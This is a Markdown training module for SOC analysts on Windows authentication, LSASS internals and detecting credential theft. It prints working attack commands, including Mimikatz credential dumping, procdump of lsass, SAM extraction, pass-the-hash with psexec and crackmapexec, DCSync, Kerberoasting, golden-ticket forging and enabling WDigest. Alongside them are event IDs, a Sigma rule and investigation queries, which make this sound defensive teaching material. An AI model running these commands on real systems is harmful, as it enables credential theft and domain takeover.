# Windows/06 — Authentication & LSASS

> LSASS is the single most targeted process on a Windows system. It holds every active credential in memory. Understanding how Windows authentication works at the internals level is the foundation of detecting credential theft, lateral movement, and domain compromise.

![MITRE](https://img.shields.io/badge/MITRE-T1003%20|%20T1110%20|%20T1558%20|%20T1550-red)
![Platform](https://img.shields.io/badge/Platform-Windows-blue)

---

## Windows Authentication Architecture

```
User provides credentials
        |
        v
Winlogon.exe          <- handles interactive logon UI
        |
        v
LSASS.exe             <- Local Security Authority Subsystem Service
        |
   +---------+--------+----------+
   |         |        |          |
  NTLM    Kerberos  MSV1_0   CredSSP    <- Security Support Providers
   |         |
   v         v
  SAM      Active Directory (KDC)
```

LSASS manages Security Support Providers, credential caching, token generation, LSA secrets, and Kerberos tickets. Every authentication request passes through it.

---

## The SAM Database

Stores local user account NTLM hashes. Never plaintext passwords.

```
Location:   C:\Windows\System32\config\SAM
Registry:   HKLM\SAM
```

Locked by OS while Windows is running. Requires SYSTEM key to decrypt.

### Hash Format

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

- RID 500 = Administrator
- LM hash disabled by default on modern Windows
- NT hash = MD4 of UTF-16LE encoded password

### Extracting SAM

```powershell
# Live system — requires SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Via Volume Shadow Copy
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\

# Offline parsing
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

---

## NTLM Authentication

Challenge-response protocol. Does not require a domain controller.

```
Client                          Server
  |--- Negotiate (flags) -------> |
  |<-- Challenge (8-byte nonce)---|
  |--- Response (HMAC-MD5 of      |
       NT_hash + challenge) -----> |
```

Plaintext password never crosses the network — only the hash-derived response.

### Pass-the-Hash

Because NTLM only requires the NT hash, an attacker with the hash authenticates directly without cracking it.

```bash
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.10
crackmapexec smb 192.168.1.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

Detection: Event ID 4624 Logon Type 3 with NtLmSsp authentication package from unexpected source.

---

## Kerberos Authentication

Default protocol for domain-joined systems. Uses tickets instead of hashes over the network.

```
Client          KDC (Domain Controller)        Service
  |-- AS-REQ --> |                               |
  |<-- AS-REP ---|  (TGT returned)               |
  |-- TGS-REQ -->|                               |
  |<-- TGS-REP --|  (Service Ticket returned)    |
  |-- AP-REQ -------------------------------->   |
      (Service Ticket presented)
```

### Ticket Storage

```powershell
klist          # view current tickets
klist purge    # remove all tickets
```

Tickets stored in LSASS memory. TGT encrypted with krbtgt account hash.

---

## LSASS Memory Contents

LSASS holds in memory for every logged-on user:
- NTLM hashes
- Kerberos tickets (TGT and service tickets)
- Cleartext passwords (if WDigest enabled)
- LSA secrets
- Cached domain credentials (DCC2 hashes)

### LSA Secrets

```
HKLM\SECURITY\Policy\Secrets
```

Service account credentials, cached domain passwords. Requires SYSTEM to read.

### Cached Domain Credentials

Last 10 domain logons cached locally (DCC2/MSCACHE2 format). Allows logon when DC unreachable. Slow to crack due to PBKDF2.

```
HKLM\SECURITY\Cache
```

---

## Credential Dumping Techniques

### Mimikatz

```powershell
privilege::debug
sekurlsa::logonpasswords    # all credentials from LSASS memory
sekurlsa::tickets           # Kerberos tickets
sekurlsa::wdigest           # cleartext if WDigest enabled
lsadump::sam                # SAM hashes
lsadump::secrets            # LSA secrets
lsadump::cache              # cached domain credentials
```

### LSASS Process Dump

```powershell
# ProcDump
procdump.exe -ma lsass.exe lsass.dmp

# Parse offline
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### DCSync

Mimics domain replication to pull hashes from AD without touching LSASS on any endpoint.

```powershell
lsadump::dcsync /domain:corp.local /user:Administrator
lsadump::dcsync /domain:corp.local /all /csv
```

Detection: Event ID 4662 on DC — replication permissions from non-DC machine.

---

## Kerberos Attacks

### Kerberoasting (T1558.003)

Any domain user requests a service ticket for an SPN-enabled account. Ticket encrypted with service account hash — cracked offline.

```bash
GetUserSPNs.py corp.local/user:password -outputfile hashes.txt
hashcat -m 13100 hashes.txt wordlist.txt
```

Detection: Event ID 4769 — service ticket request with RC4 encryption (0x17).

### AS-REP Roasting (T1558.004)

Accounts with pre-authentication disabled return an AS-REP encrypted with their hash — crackable without credentials.

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt
```

Detection: Event ID 4768 — AS-REQ without pre-authentication.

### Golden Ticket (T1558.001)

Forge a TGT using the krbtgt hash. Valid for 10 years. Survives user password resets.

```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:golden.kirbi
kerberos::ptt golden.kirbi
```

---

## WDigest — Cleartext in Memory

When enabled, Windows stores cleartext credentials in LSASS.

```
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
UseLogonCredential = 0  (disabled, secure, default Windows 8.1+)
UseLogonCredential = 1  (enabled, cleartext in memory)
```

Attackers enable WDigest, wait for logon, dump cleartext.

```powershell
# Attacker enables WDigest
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

Detection: Monitor registry key for modification — any write outside patch/deployment windows is suspicious.

---

## PPL — Protected Process Light

Prevents standard OpenProcess calls from reading LSASS memory even from SYSTEM.

```powershell
# Check if LSASS is PPL protected
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL
# 1 = enabled
```

Bypass via BYOVD (Bring Your Own Vulnerable Driver) — load a signed but vulnerable kernel driver, exploit to disable PPL.

---

## Detection

### Sysmon Event ID 10 — ProcessAccess

Most reliable credential dumping indicator. Fires when a process opens LSASS with read access.

Key access masks for dumping:
- `0x1010` — PROCESS_VM_READ + PROCESS_QUERY_LIMITED_INFORMATION
- `0x1410` — adds PROCESS_QUERY_INFORMATION
- `0x1438` — full dump access

```powershell
# Query Sysmon log for LSASS access
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational'; Id=10
} | Where-Object {
  $_.Message -match 'lsass.exe'
} | Select-Object TimeCreated, Message
```

### Critical Event IDs

| Event ID | Log | Description |
|----------|-----|-------------|
| 4624 | Security | Successful logon — check logon type and auth package |
| 4625 | Security | Failed logon — brute force detection |
| 4648 | Security | Explicit credential use — lateral movement |
| 4672 | Security | Special privileges assigned — admin logon |
| 4768 | Security | Kerberos TGT request |
| 4769 | Security | Kerberos service ticket request |
| 4771 | Security | Kerberos pre-auth failed |
| 4776 | Security | NTLM auth attempt |
| 4662 | Security | Object access on DC — DCSync indicator |
| 10 | Sysmon | ProcessAccess on lsass.exe |

### Logon Types Reference

| Type | Name | Attack Scenario |
|------|------|----------------|
| 2 | Interactive | Physical logon |
| 3 | Network | SMB lateral movement |
| 4 | Batch | Scheduled task execution |
| 5 | Service | Malicious service |
| 9 | NewCredentials | RunAs /netonly — PtH variant |
| 10 | RemoteInteractive | RDP lateral movement |

---

## Investigation Commands

```powershell
# Active logon sessions
query user

# Kerberos tickets
klist

# WDigest status
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest

# LSASS PPL status
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL

# AS-REP roastable accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Kerberoastable accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Recent successful logons
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 50 |
  ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
      Time      = $_.TimeCreated
      User      = $xml.Event.EventData.Data[5].'#text'
      LogonType = $xml.Event.EventData.Data[8].'#text'
      Source    = $xml.Event.EventData.Data[18].'#text'
      AuthPkg   = $xml.Event.EventData.Data[14].'#text'
    }
  }

# Pass-the-hash indicator — Type 3 NTLM logon
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 1000 |
  Where-Object {
    $xml = [xml]$_.ToXml()
    $xml.Event.EventData.Data[8].'#text' -eq '3' -and
    $xml.Event.EventData.Data[14].'#text' -eq 'NTLM'
  }
```

---

## MITRE ATT&CK Mapping

| Technique | ID |
|-----------|-----|
| OS Credential Dumping: LSASS Memory | T1003.001 |
| OS Credential Dumping: SAM | T1003.002 |
| OS Credential Dumping: LSA Secrets | T1003.004 |
| OS Credential Dumping: Cached Credentials | T1003.005 |
| OS Credential Dumping: DCSync | T1003.006 |
| Kerberoasting | T1558.003 |
| AS-REP Roasting | T1558.004 |
| Golden Ticket | T1558.001 |
| Pass the Hash | T1550.002 |

---

## Sigma Rule — LSASS Access

```yaml
title: LSASS Memory Access by Non-System Process
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: stable
description: >
  Detects processes opening LSASS with read access.
  Primary indicator of credential dumping tools.
author: Solomon James (@Jaysolex)
tags:
  - attack.credential_access
  - attack.t1003.001
logsource:
  product: windows
  category: process_access
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'
      - '0x1410'
      - '0x1438'
  filter_system:
    SourceImage|startswith:
      - 'C:\Windows\system32\'
      - 'C:\Windows\SysWOW64\'
  condition: selection and not filter_system
falsepositives:
  - EDR agents and security scanners
level: high
```

---

## Practitioner Notes

**On WDigest in IR:** Finding `UseLogonCredential = 1` is evidence of attacker preparation — they enabled it before the next logon to harvest cleartext. Check the registry key timestamp and correlate with other attacker activity on the same host.

**On DCSync detection:** DCSync never touches LSASS on any endpoint. Detection requires monitoring the DC for replication requests originating from non-DC machines using Event ID 4662 with replication GUIDs.

**On Golden Ticket persistence:** Resetting the target user password does not invalidate a Golden Ticket — it is signed with the krbtgt hash. The krbtgt password must be reset twice to invalidate all existing tickets.

**On PtH scope:** Pass-the-Hash only works against NTLM. In Kerberos-only environments, Pass-the-Ticket achieves the same lateral movement using stolen Kerberos tickets instead.

---

## Knowledge Validation

**Why does Pass-the-Hash work without knowing the plaintext password?**
NTLM authentication sends an HMAC-MD5 of the NT hash combined with a server challenge — never the plaintext. An attacker with the NT hash performs the same calculation and authenticates directly. This is a design property of NTLM, not a vulnerability per se.

**What is the difference between Kerberoasting and AS-REP Roasting?**
Kerberoasting requires valid domain credentials to request service tickets for SPN-enabled accounts, then cracks offline. AS-REP Roasting targets accounts with pre-authentication disabled — no credentials required, the KDC returns an AS-REP encrypted with the account hash crackable offline.

**Sysmon Event ID 10 shows GrantedAccess 0x1410 on lsass.exe. What does this indicate?**
Access mask 0x1410 includes PROCESS_VM_READ and PROCESS_QUERY_INFORMATION — the exact rights needed to read LSASS memory and extract credentials. High-confidence credential dumping indicator. Investigate SourceImage, correlate with process creation logs for the source binary.

**Why must krbtgt be reset twice to invalidate Golden Tickets?**
Active Directory stores two versions of the krbtgt password for replication convergence. A ticket signed with either version remains valid. First reset invalidates old-version tickets but the previous password persists. Second reset removes it — all existing Golden Tickets become invalid.

---

*Windows/06-Authentication-LSASS | OS-Internals-for-SOC | Solomon James (@Jaysolex)*
